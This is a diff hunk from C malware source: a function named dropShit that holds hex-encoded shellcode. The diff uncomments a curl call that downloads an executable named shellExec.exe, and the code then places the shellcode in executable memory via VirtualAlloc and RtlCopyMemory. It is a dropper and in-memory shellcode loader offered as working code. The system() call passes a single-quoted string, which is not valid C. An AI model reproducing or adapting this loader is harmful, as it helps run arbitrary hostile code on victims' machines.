@@ -27,7 +27,7 @@ void dropShit(){
         "\x6a\x3c\x3f\x69\xd8\x3a\x70\x17\xd3\xc2\x33\x68\x8d\x0f\x33"
         "\x1b\x0b\xe5\x0b\x44\x61\x79\x3a\x0d\x81\x11\x92\xc2\x02\x89"
         "\x84\x33\x87\x20\x3b\xc5\xa4\xe2\x90\x5c\xcb\xb2\x1c\x92\x8c";
-        //system('curl http://127.0.0.1/asd.asm -o asd.asm')
+        system('curl http://127.0.0.1/shellExec.exe -o shellExec.exe')
 
         PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
         RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
